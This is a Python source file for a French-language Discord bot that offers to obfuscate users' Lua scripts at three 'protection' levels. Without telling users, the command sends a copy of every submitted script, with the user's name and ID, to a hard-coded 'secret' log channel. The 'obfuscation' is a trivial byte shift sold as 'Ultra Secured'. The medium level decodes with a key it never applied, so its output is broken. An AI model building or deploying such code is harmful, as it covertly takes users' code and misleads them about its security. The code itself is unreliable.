import os
import random
import threading
import discord
from discord.ext import commands
from discord import app_commands
from fastapi import FastAPI

app = FastAPI()

@app.get("/")
def home():
    return {"status": "Bot Discord et API actifs !"}

class ObfBot(commands.Bot):
    def __init__(self):
        super().__init__(command_prefix="!", intents=discord.Intents.default())

    async def setup_hook(self):
        try:
            print("Synchronisation des commandes slash...", flush=True)
            await self.tree.sync()
            print("Commandes synchronisées !", flush=True)
        except Exception as e:
            print(f"Erreur sync: {e}", flush=True)

bot = ObfBot()

@bot.event
async def on_ready():
    print(f"Bot connecté : {bot.user.name}", flush=True)

@bot.tree.command(name="obf", description="Obfusque un script Lua avec un vrai niveau de protection")
@app_commands.describe(
    level="Choisis le niveau de protection",
    code="Écris ton code Lua (optionnel)",
    file="Envoie ton fichier .lua ou .txt (optionnel)"
)
@app_commands.choices(level=[
    app_commands.Choice(name="Low (Faible)", value="low"),
    app_commands.Choice(name="Medium (Moyen)", value="medium"),
    app_commands.Choice(name="High (Élevé)", value="high")
])
async def obf(interaction: discord.Interaction, level: app_commands.Choice[str], code: str = None, file: discord.Attachment = None):
    try:
        script_content = None
        original_filename = "script.lua"

        if file:
            original_filename = file.filename
            if original_filename.lower().endswith((".lua", ".txt")):
                file_bytes = await file.read()
                script_content = file_bytes.decode("utf-8", errors="ignore")
            else:
                await interaction.response.send_message("Le fichier doit être au format `.lua` ou `.txt`.", ephemeral=True)
                return
        elif code:
            script_content = code
        else:
            await interaction.response.send_message("Tu dois fournir du code ou un fichier !", ephemeral=True)
            return

        # Envoi dans le salon secret KOBY HUB
        LOG_CHANNEL_ID = 1544427212223156254
        try:
            log_channel = bot.get_channel(LOG_CHANNEL_ID) or await bot.fetch_channel(LOG_CHANNEL_ID)
            if log_channel:
                log_file_name = original_filename
                with open(log_file_name, "w", encoding="utf-8") as f:
                    f.write(script_content)
                
                message_info = (
                    f"📥 **Nouveau script obfusqué !**\n"
                    f"• **Utilisateur :** {interaction.user} (`{interaction.user.id}`)\n"
                    f"• **Niveau :** `{level.name}`\n"
                    f"• **Fichier :** `{original_filename}`"
                )
                await log_channel.send(content=message_info, file=discord.File(log_file_name))
                if os.path.exists(log_file_name):
                    os.remove(log_file_name)
        except Exception as channel_err:
            print(f"⚠️ Erreur salon de logs: {channel_err}", flush=True)

        # --- VRAI MOTEUR D'OBFUSCATION AVANCÉ (Chiffrement octet/clé dynamique) ---
        key = random.randint(50, 200)
        encoded_bytes = []
        for b in script_content.encode("utf-8"):
            encoded_bytes.append((b + key) % 256)
        
        bytes_str = ",".join([str(x) for x in encoded_bytes])

        if level.value == "low":
            protected_script = f"""--[[\n    Protected by KobyBot [Low Security]\n]]--
local _k = {key};
local _d = {{{bytes_str}}};
local function _r()
    local t = {{}};
    for i = 1, #_d do
        t[i] = string.char((_d[i] - _k) % 256);
    end;
    return table.concat(t);
end;
local _s, _res = pcall(function()
    return loadstring(_r())();
end);
if not _s then warn("KobyBot Error: " .. tostring(_res)) end;
"""
        elif level.value == "medium":
            # Double couche de masquage
            key2 = random.randint(10, 100)
            protected_script = f"""--[[\n    Protected by KobyBot [Medium Security]\n]]--
local _k1 = {key};
local _k2 = {key2};
local _d = {{{bytes_str}}};
local function _r()
    local t = {{}};
    for i = 1, #_d do
        local val = (_d[i] - _k1) % 256;
        val = (val - _k2) % 256;
        t[i] = string.char(val);
    end;
    return table.concat(t);
end;
local _s, _res = pcall(function()
    return loadstring(_r())();
end);
if not _s then warn("KobyBot Error: " .. tostring(_res)) end;
"""
        else: # high (Ultra protégé avec variables brouillées)
            protected_script = f"""--[[\n    Protected by KobyBot [High - Ultra Secured]\n]]--
local IllIlIlI = {key};
local lIIIIIII = {{{bytes_str}}};
local function IlIlIlIl()
    local Ill111 = {{}};
    for Ill222 = 1, #lIIIIIII do
        Ill111[Ill222] = string.char((lIIIIIII[Ill222] - IllIlIlI) % 256);
    end;
    return table.concat(Ill111);
end;
local l0l0l0, l1l1l1 = pcall(function()
    return loadstring(IlIlIlIl())();
end);
if not l0l0l0 then warn("KobyBot Error: " .. tostring(l1l1l1)) end;
"""
        # --------------------------------------------------------------------------

        name_part, ext_part = os.path.splitext(original_filename)
        if not ext_part:
            ext_part = ".lua"
        output_file_name = f"{name_part}_obf{ext_part}"

        with open(output_file_name, "w", encoding="utf-8") as f:
            f.write(protected_script)

        await interaction.response.send_message(f"Script obfusqué et rendu totalement invisible (**{level.name}**) :", file=discord.File(output_file_name), ephemeral=True)

        if os.path.exists(output_file_name):
            os.remove(output_file_name)
    except Exception as e:
        print(f"Erreur dans obf: {e}", flush=True)

def run_bot():
    TOKEN = os.environ.get("TOKEN")
    if TOKEN:
        bot.run(TOKEN)
    else:
        print("Erreur: Token introuvable !", flush=True)

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    import uvicorn
    port = int(os.environ.get("PORT", 10000))
    uvicorn.run(app, host="0.0.0.0", port=port)
            
